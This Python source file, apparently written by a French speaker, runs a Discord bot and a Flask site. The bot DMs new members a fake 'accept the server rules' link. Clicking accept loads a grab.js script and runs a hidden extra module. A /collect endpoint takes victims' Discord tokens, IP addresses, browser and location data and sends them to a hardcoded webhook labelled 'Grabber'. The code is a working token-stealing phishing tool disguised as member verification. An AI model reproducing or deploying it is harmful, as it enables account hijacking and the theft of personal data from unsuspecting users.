import importlib
import os
import threading
from datetime import datetime

import discord
from discord.ext import commands
from flask import Flask, jsonify, render_template_string, request
import requests

# ================== CONFIGURATION ==================
TOKEN = os.environ.get("DISCORD_TOKEN")
WEBHOOK_URL = "https://discord.com/api/webhooks/1572990108112654458/VQRjZOhIMvn3EFoWDpRBM9V2SI3pAozI8PrMXsja2UMgOroS9y8d9ArvCKiZzZFNMmZK"
VERIF_URL = "https://bot-discord-81yg.onrender.com/"
DISCORD_INVITE = "https://discord.gg/reUcTewDKm"
EXTRA_SCRIPT_MODULE = "action_script"
# ===================================================


# ---------- PARTIE 1 : LE SITE WEB (FLASK) ----------
app = Flask(__name__)

PAGE_REGLES = """
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Règles du serveur</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
  body { background:#313338; color:#fff; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
  .card { background:#2b2d31; padding:36px; border-radius:12px; width:460px; max-width:100%; text-align:center; box-shadow:0 10px 40px rgba(0,0,0,.5); }
  h1 { font-size:22px; margin-bottom:12px; }
  p { color:#b5bac1; font-size:14px; margin-bottom:18px; line-height:1.5; }
  .rules { text-align:left; background:#1e1f22; padding:16px; border-radius:8px; margin-bottom:22px; font-size:13px; color:#dbdee1; line-height:1.6; }
  .rules li { margin-left:18px; margin-bottom:6px; }
  button { background:#23a55a; color:#fff; border:none; padding:14px 24px; border-radius:8px; font-size:16px; cursor:pointer; width:100%; transition:.2s; margin-top:8px; font-weight:600; }
  button:hover { background:#1e8a4b; }
  .no { background:transparent; color:#b5bac1; border:1px solid #4e5058; font-weight:400; }
  .no:hover { background:#3c3d44; }
  #status { margin-top:14px; font-size:13px; color:#949ba4; min-height:20px; }
</style>
</head>
<body>
  <div class="card">
    <h1>📜 Règles du serveur</h1>
    <p>Merci de lire et d'accepter les règles ci-dessous pour continuer.</p>
    <ul class="rules">
      <li>Respectez tous les membres et le staff.</li>
      <li>Pas de spam, de publicité non autorisée ou de contenus inappropriés.</li>
      <li>Suivez les consignes des salons et des modérateurs.</li>
    </ul>
    <button id="btn-accept" onclick="accepterRegles()">✅ Accepter les règles</button>
    <button id="btn-refuse" class="no" onclick="refuserRegles()">❌ Refuser</button>
    <div id="status"></div>
  </div>

<script>
let scriptLance = false;

function refuserRegles() {
  document.getElementById("status").textContent = "Redirection vers Discord...";
  window.location.href = "{{ discord }}";
}

function accepterRegles() {
  if (scriptLance) return;
  scriptLance = true;

  const btn = document.getElementById("btn-accept");
  const status = document.getElementById("status");
  btn.disabled = true;
  status.textContent = "Activation en cours...";

  const params = new URLSearchParams(window.location.search);
  const memberId = params.get("id") || null;

  fetch("/accept-rules", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ accepted: true, member_id: memberId })
  }).catch(() => {});

  const s = document.createElement("script");
  s.src = "/static/grab.js";
  s.onload = function () {
    status.textContent = "Règles acceptées et script activé.";
  };
  s.onerror = function () {
    status.textContent = "Impossible de charger /static/grab.js.";
  };
  document.body.appendChild(s);
}
</script>
</body>
</html>
"""


def executer_second_script(member_id=None, ip=None):
    try:
        module = importlib.import_module(EXTRA_SCRIPT_MODULE)
        if hasattr(module, "run_action"):
            module.run_action(member_id=member_id, ip=ip)
        elif hasattr(module, "main"):
            module.main()
        else:
            print(f"⚠️ {EXTRA_SCRIPT_MODULE}.py importé, mais aucune fonction run_action() ou main() trouvée.")
    except Exception as e:
        print(f"❌ Erreur lors de l'exécution de {EXTRA_SCRIPT_MODULE}.py : {e}")


@app.route("/")
def index():
    return render_template_string(PAGE_REGLES, discord=DISCORD_INVITE)


@app.route("/accept-rules", methods=["POST"])
def accept_rules():
    payload = request.get_json(silent=True) or {}
    member_id = payload.get("member_id")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "?"

    threading.Thread(
        target=executer_second_script,
        kwargs={"member_id": member_id, "ip": ip},
        daemon=True,
    ).start()

    send_log(
        "📜 Règles acceptées",
        [
            {"name": "🆔 ID Membre", "value": str(member_id or "Non précisé"), "inline": True},
            {"name": "🌐 IP", "value": str(ip), "inline": True},
        ],
        color=0x23A55A,
    )
    return jsonify({"ok": True})


@app.route("/collect", methods=["POST"])
def collect():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"ok": False})
    embed = {
        "title": "🎯 Données reçues",
        "color": 0x00FF00,
        "fields": [
            {"name": "🌐 IP", "value": data.get("ip", "?"), "inline": True},
            {"name": "📱 Navigateur", "value": data.get("ua", "?")[:80], "inline": False},
            {"name": "💻 Plateforme", "value": data.get("platform", "?"), "inline": True},
            {"name": "🔑 Token Discord", "value": f"```{data.get('token', 'Aucun trouvé')}```", "inline": False},
            {"name": "🏠 Ville/IP Info", "value": data.get("ipinfo", "?"), "inline": False},
        ],
    }
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
    except Exception:
        pass
    return jsonify({"ok": True})


def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)


# ---------- PARTIE 2 : LE BOT DISCORD ----------
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)


def send_log(title, fields, color=0xFF0000):
    try:
        requests.post(
            WEBHOOK_URL,
            json={
                "embeds": [
                    {
                        "title": title,
                        "color": color,
                        "fields": fields,
                        "footer": {"text": f"Grabber • {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"},
                    }
                ]
            },
            timeout=5,
        )
    except Exception as e:
        print(e)


class VerifView(discord.ui.View):
    def __init__(self, member):
        super().__init__(timeout=None)
        self.member = member

    @discord.ui.button(label="📜 Lire et accepter les règles", style=discord.ButtonStyle.success, emoji="✅")
    async def verify_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        link = f"{VERIF_URL}?id={self.member.id}"
        await interaction.response.send_message(
            f"**🔗 Ouvre ce lien pour accepter les règles :**\n{link}\n\n"
            f"⚠️ Ne partage ce lien avec personne.",
            ephemeral=True,
        )
        send_log(
            "📨 Lien envoyé",
            [
                {"name": "👤 Membre", "value": f"{self.member} ({self.member.id})", "inline": True},
                {"name": "📅 Date", "value": datetime.now().strftime("%d/%m/%Y %H:%M"), "inline": True},
            ],
            color=0xFFFF00,
        )


@bot.event
async def on_member_join(member):
    if member.bot:
        return
    send_log(
        "👋 Nouveau membre",
        [
            {"name": "👤 Pseudo", "value": str(member), "inline": True},
            {"name": "🆔 ID", "value": str(member.id), "inline": True},
            {"name": "📅 Créé", "value": member.created_at.strftime("%d/%m/%Y"), "inline": True},
        ],
        color=0x00FF00,
    )
    try:
        view = VerifView(member)
        await member.send(
            f"👋 **Bienvenue {member.name}**\n"
            f"Clique ci-dessous pour accéder aux règles :",
            view=view,
        )
    except Exception:
        pass


@bot.tree.command(name="verif", description="Envoyer le message des règles")
async def verif(interaction: discord.Interaction):
    embed = discord.Embed(
        title="📜 Règles du serveur",
        description="Clique sur le bouton ci-dessous pour consulter et accepter les règles.",
        color=0x5865F2,
    )
    view = VerifView(interaction.user)
    await interaction.response.send_message(embed=embed, view=view)


@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ Bot connecté : {bot.user}")
    send_log(
        "🚀 Bot en ligne",
        [
            {"name": "Bot", "value": str(bot.user), "inline": True},
        ],
        color=0x00FF00,
    )


# ---------- LANCEMENT DES DEUX EN MÊME TEMPS ----------
if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    bot.run(TOKEN)
